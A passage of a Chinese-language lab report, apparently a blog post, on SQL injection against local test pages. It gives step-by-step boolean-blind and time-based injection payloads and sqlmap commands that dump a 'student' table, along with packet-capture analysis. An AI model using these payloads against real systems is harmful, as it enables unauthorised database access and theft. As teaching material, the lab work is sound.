-<p>结果都没有<br><img src="/网络安全实验/网络对抗原理实验一/b5.png" alt="coin"></p>
-</blockquote>
-<blockquote>
-<p>但是我确实是可以进行注入的</p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/b6.png" alt="coin"><br><img src="/网络安全实验/网络对抗原理实验一/b7.png" alt="coin"></p>
-<blockquote>
-<p>究其原因，原来是我在编写第二个php脚本时把所有返回行超过1行的结果都输出no，确实是可以进行注入的</p>
-</blockquote>
-</li>
-</ul>
-</li>
-<li><p>猜测数据库中表的数量</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/b7.png" alt="coin"></p>
-<blockquote>
-<p>第一条就显示yes，说明该数据库中表的数量为1</p>
-</blockquote>
-</li>
-<li><p>猜测每个表的长度</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=2#</span></span><br><span class="line"><span class="string">……………………</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>直到当尝试表长是否为7时，返回yes，得出该表长度为7<img src="/网络安全实验/网络对抗原理实验一/b8.png" alt="coin"></li>
-<li>这里limit a，b  #返回第a+1至a+b行的数据</li>
-</ul>
-</li>
-<li><p>猜测第一个表的表名</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment"># =&gt;true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122# =&gt;true</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">109</span><span class="comment"># =&gt;true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118# =&gt;false</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">115</span><span class="comment"># =&gt; true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117# =&gt; false</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">116</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<p> <strong>TIPS:substr的用法</strong></p>
-<blockquote>
-<p>一般有两种<br> SBUSTR(str,pos);<br> 就是从pos开始的位置，一直截取到最后</p>
-</blockquote>
-<blockquote>
-<p>SUBSTR(str,pos,len);<br> 这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。</p>
-</blockquote>
-<p> 猜测第二个字母的时候可以用</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p> 猜测第二个表的第一个字母是可以用</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">2</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>以此类推就可以得到表名为student</p>
-</blockquote>
-</li>
-<li><p>猜测student表中每列的名字</p>
-<ul>
-<li><p>猜测student表的字段数</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span>)=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and (select count(column_name) from information_schema.columns where table_name='</span>student<span class="string">')=3# =&gt; true</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>猜测student表的每一列长度</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 0,1),1))=2# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第一列列名长度为2</p>
-</blockquote>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 1,1),1))=4# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第二列列名长度为4</p>
-</blockquote>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 2,1),1))=5# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第三列列名长度为5</p>
-</blockquote>
-</li>
-<li><p>猜测student表的每一列列名</p>
-<blockquote>
-<p>用猜测表名的方法进行猜测</p>
-</blockquote>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment"># =&gt; true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 0,1),1,1))&lt;122# =&gt; true</span></span><br><span class="line"><span class="string">……………………</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>用这种方法就可以将每个表名猜出，依次为id,name,score</p>
-</blockquote>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-<ul>
-<li><p>这一小问在上一问的基础上加入了随机字符串</p>
-<ul>
-<li>然而针对上一问的手工盲注方法对这一问同样有效<img src="/网络安全实验/网络对抗原理实验一/b9.png" alt="coin"><br>  <img src="/网络安全实验/网络对抗原理实验一/b10.png" alt="coin"></li>
-<li>我推测这种方法应该是为了防sqlmap，让其对返回值的true or false难以检测</li>
-<li>后来查阅了一下资料发现是为了模拟正常业务，因为正常情况下页面回显是需要自己去找的。</li>
-</ul>
-</li>
-<li><p>下一小问只是在查询语句中加入了<code>AND score&gt;60</code>，这样的话只要填上闭合向量’#’就可以过滤掉后面的WHERE条件判定</p>
-</li>
-<li><p>对于固定输出的内容就不能用盲注了，因为我们不能得到true or false，所以只能用基于时间的注入攻击</p>
-<ol>
-<li><p>先判断是否有注入点</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(2)<span class="comment"># =&gt;等待，有注入点</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断当前数据库名长度</p>
-<p> <strong>TIPS</strong>：sleep（n） 语句：使数据库在暂停n秒之后再将搜索结果输出；if（（条件），m，n）语句：若条件为真 返回m，若条件为假 返回n；</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1'  and sleep(if((length(database())=1),3,0))<span class="comment"># =&gt;不等待</span></span><br><span class="line">1'  and sleep(if((length(database())=2),3,0))<span class="comment"># =&gt;不等待</span></span><br><span class="line">1'  and sleep(if((length(database())=3),3,0))<span class="comment"># =&gt;不等待</span></span><br><span class="line">1'  and sleep(if((length(database())=4),3,0))<span class="comment"># =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>则数据库名长度为4</p>
-</blockquote>
-</li>
-<li><p>判断数据库名</p>
-<p> <strong>TIPS</strong>：<br> <code>mid(database(), m, n)</code>:返回数据库名的第m位之后的n位；</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((mid(database(),1,1)='t'),3,0))<span class="comment"># =&gt; 't'</span></span><br><span class="line">1' and sleep(if((mid(database(),2,1)='e'),3,0))<span class="comment"># =&gt; 'e'</span></span><br><span class="line">1' and sleep(if((mid(database(),3,1)='s'),3,0))<span class="comment"># =&gt; 's'</span></span><br><span class="line">1' and sleep(if((mid(database(),4,1)='t'),3,0))<span class="comment"># =&gt; 't'</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>所以数据库名为test</p>
-</blockquote>
-</li>
-<li><p>判断表的个数</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if(((<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">1</span>),<span class="number">3</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>有一个表</p>
-</blockquote>
-</li>
-<li><p>猜测每个表的长度</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if(((<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">1</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;不等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if(((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=7),2,0))# =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>表名长度为7</p>
-</blockquote>
-</li>
-<li><p>判断表名</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122),2,0))# =&gt;等待</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">109</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118),2,0))# =&gt;不等待</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">115</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117),2,0))# =&gt;不等待</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">116</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;不等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115),2,0))# =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>则表名的第一个字母为’s’<br>以此类推可以得到表名’student’</p>
-</blockquote>
-</li>
-<li><p>判断表中列数</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if(((<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span>)=<span class="number">1</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt; 不等待</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if(((select count(column_name) from information_schema.columns where table_name='</span>student<span class="string">')=3),2,0))# =&gt; 等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>字段数为3</p>
-</blockquote>
-</li>
-<li><p>判断表中每列长度</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt; 等待：长度为2</span></span><br><span class="line"><span class="number">1</span><span class="string">' and sleep(if((length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 1,1),1))=4),2,0))# =&gt;等待：长度为4</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">length</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">5</span>),<span class="number">2</span>,<span class="number">0</span>))<span class="comment"># =&gt;等待：长度为5</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断表中每列列名</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(if((ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>),<span class="number">1</span>,<span class="number">0</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>一步一步来就可以搞定</p>
-</blockquote>
-</li>
-</ol>
-</li>
-<li><p>这一小问是更新数据库操作，我们可以使用更新数据注入方式来向数据库中非法插入数据，思路就是在insert、update、delete语句中人为构造语法错误，利用如下语句：</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> student <span class="keyword">SET</span> score=<span class="string">''</span>inject here<span class="string">''</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> student <span class="keyword">SET</span> score=<span class="string">'"inject here"'</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-<p>  我将在sqlmap中演示</p>
-</li>
-</ul>
-<h3 id="利用sqlmap自动化注入并用wireshark抓包分析"><a href="#利用sqlmap自动化注入并用wireshark抓包分析" class="headerlink" title="利用sqlmap自动化注入并用wireshark抓包分析"></a>利用sqlmap自动化注入并用wireshark抓包分析</h3><ol>
-<li><p>对于普通查询结果的场景，我们可以使用Union查询的方式</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>这样一来我们就找到了Union联合查询，Boolean-based和Time-based3种不同方式的注入点。</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d1.png" alt="coin"></p>
-<blockquote>
-<p>接着开始搞事情</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span> --current-db --current-user</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d2.png" alt="coin"></p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span> --tables -D <span class="built_in">test</span> --columns</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d3.png" alt="coin"></p>
-<blockquote>
-<p>dump数据库内容</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/1.php?id=1&amp;submit=submit"</span> --dump -T <span class="string">"student"</span> -D <span class="string">"test"</span></span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d4.png" alt="coin"></p>
-<blockquote>
-<p>通过抓包分析可以得出sqlmap的查询语句</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d5.png" alt="coin"><br> <img src="/网络安全实验/网络对抗原理实验一/d10.png" alt="coin"></p>
-<blockquote>
-<p>大致意思就是先判断是否有注入点，再判断过滤字符，接着判断id的最大长度（推测应该是使用二分法），然后就是用我上述手工注入的方法:数据库名长度=&gt;数据库名=&gt;表的个数=&gt;每个表名长度=&gt;每个表名=&gt;列的个数=&gt;每个列名长度=&gt;每个列名。不过我发现sqlmap用了很多随机字符串拼接的方式。</p>
-</blockquote>
-</li>
-<li><p>对于仅返回true or false结果的场景，我们可以使用Union查询的方式就失效了，只能布尔查询。</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit"</span> --batch</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d6.png" alt="coin"></p>
-<blockquote>
-<p>有布尔盲注注入点，开始搞事情</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit"</span> --tables -D <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d7.png" alt="coin"></p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/2.php?id=1&amp;submit=submit"</span> --dump -D <span class="built_in">test</span> -T student</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d8.png" alt="coin"></p>
-<blockquote>
-<p>抓包分析一下</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/d9.png" alt="coin"></p>
-<blockquote>
-<p>大体看了一下前面的查询语句和Union查询没什么区别，爆库也是按照上述的方法<br> <img src="/网络安全实验/网络对抗原理实验一/d11.png" alt="coin"></p>
-</blockquote>
-<blockquote>
-<p>选取一条感觉和我手工注入的方式很相似，然后再进行转码分析一下，发现它是采用二分法来依次确定字母ascii码值的</p>
-</blockquote>
-</li>
-<li><p>第三种对于返回值中夹杂着随机字符串的</p>
-<blockquote>
-<p>当我使用如下命令时发现并不能成功</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit"</span> --technique-B</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>于是使用</p>
-</blockquote>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit"</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>发现注入点</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e1.png" alt="coin"></p>
-<blockquote>
-<p>但是奇怪的是这却是boolean-based的盲注，继续进行发现它还是以Time-based进行注入的，应该是随机字符串防御住了布尔盲注</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e2.png" alt="coin"></p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/sql_injection/3.php?id=1&amp;submit=submit"</span> --tables -D <span class="built_in">test</span> --columns -T student</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e3.png" alt="coin"></p>
-</li>
-<li><p>这一题也有点类似</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">"http://127.0.0.1/sql_injection/4.php?id=1&amp;submit=submit"</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>在sqlmap运行的过程中，发现了如下日志</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e4.png" alt="coin"></p>
-<blockquote>
-<p>解答了刚才的疑惑，原来是添加了随机字符串之后sqlmap无法处理动态HTTP返回值</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e5.png" alt="coin"></p>
-<blockquote>
-<p>忽略字符串，终于找到了注入点</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e6.png" alt="coin"></p>
-<blockquote>
-<p>以下就可以进行爆库操作。</p>
-</blockquote>
-</li>
-<li><p>如果返回值是一个固定的值那么只能采用Time-based</p>
- <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=T -u <span class="string">"http://127.0.0.1/sql_injection/5.php?id=1&amp;submit=submit"</span> --batch</span><br></pre></td></tr></table></figure>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e3.png" alt="coin"></p>
-<blockquote>
-<p>抓包查看</p>
-</blockquote>
-<p> <img src="/网络安全实验/网络对抗原理实验一/e7.png" alt="coin"></p>
-</li>
-</ol>
-<p>###参考资料</p>
-<ol>
-<li><a href="https://blog.csdn.net/xiejunna/article/details/76576804" target="_blank" rel="noopener">https://blog.csdn.net/xiejunna/article/details/76576804</a></li>
-<li><a href="https://my.oschina.net/duwaiweb/blog/80578" target="_blank" rel="noopener">https://my.oschina.net/duwaiweb/blog/80578</a></li>
-<li><a href="https://blog.csdn.net/we_shell/article/details/37772941" target="_blank" rel="noopener">https://blog.csdn.net/we_shell/article/details/37772941</a></li>
-<li><a href="https://www.cnblogs.com/dee0912/p/5240370.html" target="_blank" rel="noopener">https://www.cnblogs.com/dee0912/p/5240370.html</a></li>
-<li><a href="https://blog.csdn.net/qq_35544379/article/details/77351783" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77351783</a></li>
-<li><a href="https://blog.csdn.net/Code_My_Life/article/details/48135319" target="_blank" rel="noopener">https://blog.csdn.net/Code_My_Life/article/details/48135319</a></li>
-<li><a href="https://blog.csdn.net/dgeek/article/details/69525403" target="_blank" rel="noopener">https://blog.csdn.net/dgeek/article/details/69525403</a></li>
-<li><a href="https://blog.csdn.net/baidu_37108358/article/details/80766939" target="_blank" rel="noopener">https://blog.csdn.net/baidu_37108358/article/details/80766939</a></li>
